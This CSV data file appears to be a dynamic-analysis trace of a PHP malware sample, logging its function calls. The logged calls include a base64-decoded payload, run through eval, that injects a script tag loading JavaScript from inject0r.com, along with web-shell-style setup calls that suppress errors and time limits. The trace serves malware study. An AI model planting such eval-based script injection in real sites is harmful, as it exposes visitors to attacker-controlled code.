uuid,file_md5,index,source,target,argc,argv,return,dynamic
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,0,__main__,zend_compile_file,2,{"value": []},{"value": "262604080808263B08413D49413C413C59732E505112342B5051263950423C3A26413C423C08413C423C0808413C284F2A59732E505112342B5051263950423C3A6A3C26413C423C08413C423C0808413C284F2A59732B393C3A3B5C5D423D26505126395008413C3A2642413C26423C02512639505108413C3A39413C3A39414141414141413C6A3C08413C3A3903030308413C3A395008413C3A4F2A413C2639413C3A2F39413C3A6A3C11342B262A26393C3A264241413C6A3C112B262A2659732B395051423C3A2B5051263950423C3A2A5051263950423C3A2A0D2B3B3B413D6A3D260D2B262A3B3B413D6A3D260D2B262A0826393C3A08262A393C3A26260826413C082641423C26512641413C004D4E8926395008413C3A262B08081E08122B1E2A08081E1E2A2A31413C2E413C342B262A26395051423C3A26505126262641423C262626423C02132D24462A2626142D24462A51081E2A080851080808081E2A59732B5051265051263950084108413C3A08262A59732B505126505126423C112B0808262A39500841423C6A3C3A08262A59732B505126505126423C112B0808262A39500841423C6A3C3A08262A08082608081E122B08081E2A2B1E2A1E00262626262647484848484848484848484848484848484826009389938993895193899389938993899389938993895193895193899389519389938951938993895193895193893B423D260000003C08083C08083C08083C08081E50512650511E3B4241423D0808081E00000000000000000000002626262628413C6A3C28280828282828080808282808282808282808282808282808282808282808282808282808282808282808282808282808282808282808282808282808282808282808282808282808282859732E505111342B28282859732B5051423C49282A28282A59732E505111342B413C0808282A59732E505111342B39413C3A3941413C3A413C263941413C3A2642423C285051265051265051262B395038413738413C3A08080808282A2A59732E505111342B50512B5051423C265051265051423C268D2E41423C342B3B4241413D263B4241413D263B4241413D263B4241413D263B4241413D263B4241413D263B4241413D263B4242423D262F3B3D4F34463B42423D2F0808080808084F3446393B080808080808413D3A262B08080808505108080808282A282A4F2A282A59732E505111342B39413C3A262B3941413C3A39413C3A39413C3A2641413C2642423C263950423C3A28264D4E892641423C2B4142433C3C5151423C6A3C132B3950515108413C3A6A3C2608085151080851510808510808510808283C24462A2A2A31282A39413C3A262B3941413C3A39413C3A413C2641413C2642423C263950423C3A282641413C262F4F3446423C0D2B423C2647264142433C26414151423C26423C132F423C11342F11342F11342F11342F11342F11342F11342F11342F11342F11342F11342F11342F11342B332A080808082808082824462A423C282A122B3941413C3A39413C3A39413C3A2641413C2642423C263950423C3A28262626142D24462A3950423C3A262B41423C081E2A2A28423C2641413C2642423C423C2641413C262F4F3446423C0D2B423C2647264142433C26414151423C26423C132F423C11342F11342F11342F11342F11342F11342F11342F11342F11342F11342F11342F11342F11342B332A080808082808082824462A423C28413C2A282A59732E505111342B413C28505146283C282839413C3A6350512663505126635051262838413C26423C262B395038363841413C3A263950423C3A26395042423C3A262B3738363837282A2A2A59732E505111342B59732B282A505126505126505126505126505126505126393B4242423D3A2F3B3D4F3446393B423D3A2F3B3D4F34464141423C2626373837413C1E1E393B08080808413D3A262F3B3D4F34462B282A2A59732E505111342B413C8D8D8D8D8D8D8D2859730D2E59730D342B413C2B162A160808413C2B162A160808282A5051265051112B5051112B3B423D2A5051112B3B423D2A5051112B3B423D2A2A5051112B3B423D2A282A59732E505111342B26262626413C413C413C0D2B284F2A732B162A1626112B5126423C262A63413C2B393B41413D3A2A3941413C3A3941413C3A39413C3A393C3A59732B415051423C262A505151423C2B50515126423C262A2859730D2B373837282A5051260D2B284F2A4141423C6A3C26423C2637383728263C263B3D2626132D24462A3B3D93892A26132D172A112B26132D24462A0151423C080828282A2A0126132B262A37383638372826132D24462A032601730D2B26322A3738370151423C0808010151423C0808010151423C0808010151423C0808010151423C0808010151423C0808010151423C0808010151423C0808010151423C0808010151423C08080808080893896347634863486348634863474863486348635148263B5D42423D3B425D423D2A263B42423D132C26132D24462A112B322A3B425D423D3B5D4263413D26122B2B2828413C3B5D423D3B5D4263413D26112B322A2A2A2A2A3C022628373837283B423D112B282A4F2A59732E505111342B26413C505126505126505126505126505126112B262A288D8D722E720D342B722E72342B29464F2A722B29464F2A722B29464F2A41423C2641423C2629464D4E8926423C264D4E8926423C26112B3B424242423D2A112B3B424242423D2A2A312A312A37383728413C284F2A59732E505111342B59732B282A505126505126505126505126505126505126505126423C26393B4242423D3A2F3B3D4F3446393B"},[]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,1,__main__,base64_decode,1,"{""value"": [[0, ""str"", ""ZWNobyAiPFNDUklQVCBTUkM9aHR0cDovL2luamVjdDByLmNvbS91cGRhdGUuanM+PC9TQ1JJUFQ+Ijs=""]]}",{"value": "echo \"<SCRIPT SRC=http://inject0r.com/update.js></SCRIPT>\";"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,2,__main__,eval,1,"{""value"": [[0, ""phpcode"", ""echo \""<SCRIPT SRC=http://inject0r.com/update.js></SCRIPT>\"";""]]}",{"value": "void"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,3,eval,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""echo \""<SCRIPT SRC=http://inject0r.com/update.js></SCRIPT>\"";""]]}",{"value": "283E"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,4,__main__,set_time_limit,1,"{""value"": [[0, ""seconds"", 0]]}",{"value": "void"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,5,__main__,error_reporting,1,"{""value"": [[0, ""new_error_level"", 0]]}",{"value": "void"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,6,__main__,getenv,1,"{""value"": [[0, ""varname"", ""SERVER_SOFTWARE""]]}",{"value": "nginx/1.16.1"},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,7,__main__,ini_get,1,"{""value"": [[0, ""varname"", ""safe_mode""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,8,__main__,ini_get,1,"{""value"": [[0, ""varname"", ""safe_mode""]]}",{"value": false},[0]
5ae85abb9223b881e7bf3123c4fe9934,754ce09c58618e3605535f20dece15ea,9,__main__,strtolower,1,"{""value"": [[0, ""str"", false]]}",{"value": ""},[0]
